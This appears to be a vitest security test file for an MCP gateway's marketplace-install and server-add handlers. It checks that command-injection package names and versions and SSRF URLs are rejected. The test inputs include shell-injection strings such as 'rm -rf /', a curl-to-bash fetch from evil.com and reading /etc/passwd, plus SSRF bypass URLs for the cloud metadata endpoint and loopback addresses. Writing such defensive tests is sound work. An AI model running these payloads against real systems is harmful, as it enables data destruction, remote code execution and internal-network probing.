/**
 * Security tests for MCP gateway validation functions.
 *
 * Tests command injection prevention (package name / version),
 * SSRF prevention (SSE URL validation), and marketplace install rejection.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

// We test the validation indirectly through the handlers,
// since the validation functions are private module-scoped.
// Import handlers and construct mock opts.
vi.mock("../../config/config.js", () => ({
  loadConfig: vi.fn(() => ({ mcp: { servers: [] } })),
  writeConfigFile: vi.fn(),
  withConfigWriteLock: async (fn: () => Promise<unknown>) => fn(),
}));

vi.mock("../../mcp/index.js", () => ({
  getMCPManagerSafe: vi.fn(),
  initMCPManager: vi.fn(),
}));

vi.mock("../../mcp/marketplace-index.js", () => ({
  readMarketplaceIndex: vi.fn(),
}));

vi.mock("../../agents/agent-scope.js", () => ({
  resolveAgentWorkspaceDir: vi.fn(() => "/tmp"),
  resolveDefaultAgentId: vi.fn(() => "default"),
}));

vi.mock("../../agents/skills-status.js", () => ({
  buildWorkspaceSkillStatus: vi.fn(() => ({ skills: [] })),
}));

vi.mock("../../config/cn-mirrors.js", () => ({
  shouldUseCNMirror: () => false,
  getNpmMirrorUrl: () => "https://registry.npmmirror.com/",
  getPipMirrorUrl: () => "https://pypi.tuna.tsinghua.edu.cn/simple",
  getNpmMirrors: () => ["https://registry.npmmirror.com/"],
  getPipMirrors: () => ["https://pypi.tuna.tsinghua.edu.cn/simple"],
  PACKAGE_MANAGER_MIRRORS: {
    npm: { primary: "https://registry.npmmirror.com/", fallbacks: [] },
    pip: { primary: "https://pypi.tuna.tsinghua.edu.cn/simple", fallbacks: [] },
    go: { primary: "https://goproxy.cn,direct", fallbacks: [] },
  },
  BINARY_DOWNLOAD_MIRRORS: {
    github: { primary: "https://github.com", fallback: "https://ghproxy.com/https://github.com" },
    uv: {
      installScript: "https://astral.sh/uv/install.sh",
      installPs1: "https://astral.sh/uv/install.ps1",
    },
    node: { primary: "https://nodejs.org/dist" },
    goBinary: { primary: "https://go.dev/dl" },
    python: { primary: "https://www.python.org/ftp/python" },
    rust: { primary: "https://sh.rustup.rs" },
    jdk: { primary: "https://download.java.net" },
    fnm: { primary: "https://fnm.vercel.app/install" },
    signalCli: { primary: "https://github.com/AsamK/signal-cli/releases" },
    hkBinaries: { primary: "https://github.com" },
  },
  CLAWDSKILLSPROXY_CONFIG: { endpoints: {} },
  LARGE_PACKAGE_PROXY_MAP: {},
  CLI_TOOL_MIRRORS: {},
}));

import { mcpHandlers } from "./mcp-methods.js";
import { getMCPManagerSafe } from "../../mcp/index.js";
import { readMarketplaceIndex } from "../../mcp/marketplace-index.js";

const mocks = {
  getMCPManagerSafe: vi.mocked(getMCPManagerSafe),
  readMarketplaceIndex: vi.mocked(readMarketplaceIndex),
};

function makeOpts(method: string, params: Record<string, unknown> = {}) {
  return {
    method,
    params,
    respond: vi.fn(),
    sendProgress: vi.fn(),
    sendEvent: vi.fn(),
  };
}

// ============================================================================
// Command Injection Prevention
// ============================================================================

describe("mcp.marketplace.install — command injection prevention", () => {
  const handler = mcpHandlers["mcp.marketplace.install"]!;
  let lastAddedId = "";
  const mockManager = {
    addServer: vi.fn().mockImplementation(async (cfg: { id: string }) => {
      lastAddedId = cfg.id;
    }),
    removeServer: vi.fn().mockResolvedValue(undefined),
    getStatus: vi.fn().mockImplementation(() => ({
      servers: [{ config: { id: lastAddedId }, status: "running" }],
    })),
  };

  beforeEach(() => {
    lastAddedId = "";
    mocks.getMCPManagerSafe.mockReturnValue(mockManager as any);
    mockManager.addServer.mockClear();
    mockManager.removeServer.mockClear();
    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.useRealTimers();
  });

  const maliciousPackageNames = [
    "pkg; rm -rf /",
    "pkg && curl evil.com",
    "pkg | cat /etc/passwd",
    "$(curl evil.com/shell.sh | bash)",
    "`curl evil.com`",
    "pkg\nmalicious",
    "../../../etc/passwd",
    "pkg name with spaces",
  ];

  for (const name of maliciousPackageNames) {
    it(`blocks malicious npm package name: "${name}"`, async () => {
      mocks.readMarketplaceIndex.mockResolvedValue([
        {
          serverId: "evil",
          npmPackage: name,
          version: "1.0.0",
          friendlyName: "Evil",
          description: "",
          category: "other",
          tags: [],
          requiresApiKey: false,
          platforms: [],
          isOfficial: false,
          isNew: false,
          toolCount: 0,
        },
      ] as any);

      const opts = makeOpts("mcp.marketplace.install", { serverId: "evil" });
      await handler(opts);

      expect(mockManager.addServer).not.toHaveBeenCalled();
      expect(opts.respond).toHaveBeenCalledWith(
        false,
        undefined,
        expect.objectContaining({ message: expect.stringContaining("Invalid") }),
      );
    });
  }

  const maliciousVersions = [
    "1.0; rm -rf /",
    "$(evil)",
    "`evil`",
    "1.0\n&& malicious",
    "a".repeat(51), // exceeds length limit
  ];

  for (const version of maliciousVersions) {
    it(`blocks malicious version: "${version.slice(0, 30)}..."`, async () => {
      mocks.readMarketplaceIndex.mockResolvedValue([
        {
          serverId: "pkg",
          npmPackage: "valid-package",
          version,
          friendlyName: "Pkg",
          description: "",
          category: "other",
          tags: [],
          requiresApiKey: false,
          platforms: [],
          isOfficial: false,
          isNew: false,
          toolCount: 0,
        },
      ] as any);

      const opts = makeOpts("mcp.marketplace.install", { serverId: "pkg" });
      await handler(opts);

      expect(mockManager.addServer).not.toHaveBeenCalled();
      expect(opts.respond).toHaveBeenCalledWith(
        false,
        undefined,
        expect.objectContaining({ message: expect.stringContaining("Invalid") }),
      );
    });
  }

  const validPackageNames = [
    "@modelcontextprotocol/server-filesystem",
    "mcp-server-time",
    "@anthropic/mcp-brave-search",
    "some_pkg.name",
  ];

  for (const name of validPackageNames) {
    it(`allows valid package name: "${name}"`, async () => {
      mocks.readMarketplaceIndex.mockResolvedValue([
        {
          serverId: "good",
          npmPackage: name,
          version: "1.0.0",
          friendlyName: "Good",
          description: "",
          category: "other",
          tags: [],
          requiresApiKey: false,
          platforms: [],
          isOfficial: false,
          isNew: false,
          toolCount: 0,
        },
      ] as any);

      const opts = makeOpts("mcp.marketplace.install", { serverId: "good", waitMs: 100 });
      const handlerPromise = handler(opts);
      await vi.advanceTimersByTimeAsync(2001);
      await handlerPromise;

      expect(mockManager.addServer).toHaveBeenCalled();
      expect(opts.respond).toHaveBeenCalledWith(true, expect.anything());
    });
  }
});

// ============================================================================
// SSRF Prevention (SSE URL)
// ============================================================================

describe("mcp.marketplace.install — SSRF prevention", () => {
  const handler = mcpHandlers["mcp.marketplace.install"]!;
  let lastAddedId = "";
  const mockManager = {
    addServer: vi.fn().mockImplementation(async (cfg: { id: string }) => {
      lastAddedId = cfg.id;
    }),
    removeServer: vi.fn().mockResolvedValue(undefined),
    getStatus: vi.fn().mockImplementation(() => ({
      servers: [{ config: { id: lastAddedId }, status: "running" }],
    })),
  };

  // Mock fetch so SSE reachability check returns "reachable" for valid URLs
  const mockFetch = vi.fn().mockResolvedValue({ status: 200, ok: true });

  beforeEach(() => {
    lastAddedId = "";
    mocks.getMCPManagerSafe.mockReturnValue(mockManager as any);
    mockManager.addServer.mockClear();
    mockManager.removeServer.mockClear();
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout", "Date"] });
    vi.stubGlobal("fetch", mockFetch);
    mockFetch.mockClear();
  });

  afterEach(() => {
    vi.useRealTimers();
    vi.unstubAllGlobals();
  });

  const blockedUrls = [
    "http://localhost:8080/sse",
    "http://127.0.0.1:3000/sse",
    "http://0.0.0.0/sse",
    "http://10.0.0.1/sse",
    "http://172.16.0.1/sse",
    "http://192.168.1.1/sse",
    "http://169.254.169.254/latest/meta-data/",
    "ftp://evil.com/sse",
    "http://evil.local/sse",
    "http://evil.internal/sse",
    "http://0x7f000001/sse", // hex IP bypass
    "http://[::1]/sse", // IPv6 loopback
    "http://[::ffff:127.0.0.1]/sse", // IPv6-mapped IPv4
  ];

  for (const url of blockedUrls) {
    it(`blocks SSRF URL: "${url}"`, async () => {
      mocks.readMarketplaceIndex.mockResolvedValue([
        {
          serverId: "sse-evil",
          sseUrl: url,
          friendlyName: "SSE Evil",
          description: "",
          category: "other",
          tags: [],
          version: "1.0.0",
          requiresApiKey: false,
          platforms: [],
          isOfficial: false,
          isNew: false,
          toolCount: 0,
        },
      ] as any);

      const opts = makeOpts("mcp.marketplace.install", { serverId: "sse-evil" });
      await handler(opts);

      expect(mockManager.addServer).not.toHaveBeenCalled();
      expect(opts.respond).toHaveBeenCalledWith(
        false,
        undefined,
        expect.objectContaining({ message: expect.stringContaining("Invalid") }),
      );
    });
  }

  const allowedUrls = [
    // Note: *.api-inference.modelscope.net/sse is intentionally treated as
    // synthetic (fake) by isSyntheticSseUrl() and excluded from SSE installs.
    // Only genuinely public non-synthetic URLs should be listed here.
    "https://example.com/mcp/sse",
    "http://mcp.example.org:8080/sse",
  ];

  for (const url of allowedUrls) {
    it(`allows valid SSE URL: "${url}"`, async () => {
      mocks.readMarketplaceIndex.mockResolvedValue([
        {
          serverId: "sse-good",
          sseUrl: url,
          friendlyName: "SSE Good",
          description: "",
          category: "other",
          tags: [],
          version: "1.0.0",
          requiresApiKey: false,
          platforms: [],
          isOfficial: false,
          isNew: false,
          toolCount: 0,
        },
      ] as any);

      const opts = makeOpts("mcp.marketplace.install", { serverId: "sse-good" });
      const handlerPromise = handler(opts);
      // SSE polling uses Date.now()-based while loop with 500ms setTimeout intervals.
      // Advance timers past one poll interval so the loop can run.
      await vi.advanceTimersByTimeAsync(501);
      await handlerPromise;

      expect(mockManager.addServer).toHaveBeenCalled();
      expect(opts.respond).toHaveBeenCalledWith(true, expect.anything());
    });
  }
});

// ============================================================================
// mcp.servers.add — SSE URL validation
// ============================================================================

describe("mcp.servers.add — SSRF prevention", () => {
  const handler = mcpHandlers["mcp.servers.add"]!;
  const mockManager = {
    addServer: vi.fn().mockResolvedValue(undefined),
    removeServer: vi.fn().mockResolvedValue(undefined),
    getStatus: vi
      .fn()
      .mockReturnValue({ servers: [{ config: { id: "good-sse" }, status: "running" }] }),
    registry: {
      getServer: vi.fn().mockReturnValue(null),
      getAllServers: vi.fn().mockReturnValue([]),
    },
  };

  beforeEach(() => {
    mocks.getMCPManagerSafe.mockReturnValue(mockManager as any);
    mockManager.addServer.mockClear();
    mockManager.removeServer.mockClear();
  });

  it("blocks SSE server with localhost URL", async () => {
    const opts = makeOpts("mcp.servers.add", {
      id: "evil-sse",
      transport: "sse",
      url: "http://localhost:8080/sse",
    });
    await handler(opts);

    expect(mockManager.addServer).not.toHaveBeenCalled();
    expect(opts.respond).toHaveBeenCalledWith(
      false,
      undefined,
      expect.objectContaining({ message: expect.stringContaining("Invalid") }),
    );
  });

  it("blocks SSE server with private IP URL", async () => {
    const opts = makeOpts("mcp.servers.add", {
      id: "evil-sse",
      transport: "sse",
      url: "http://10.0.0.1/sse",
    });
    await handler(opts);

    expect(mockManager.addServer).not.toHaveBeenCalled();
  });

  it("allows SSE server with valid public URL", async () => {
    const opts = makeOpts("mcp.servers.add", {
      id: "good-sse",
      transport: "sse",
      url: "https://mcp.example.com/sse",
    });
    await handler(opts);

    expect(mockManager.addServer).toHaveBeenCalled();
    expect(opts.respond).toHaveBeenCalledWith(true, expect.objectContaining({ ok: true }));
  });

  it("allows stdio server without URL validation", async () => {
    const opts = makeOpts("mcp.servers.add", {
      id: "stdio-server",
      command: "npx",
      args: ["-y", "some-package"],
    });
    await handler(opts);

    expect(mockManager.addServer).toHaveBeenCalled();
  });
});
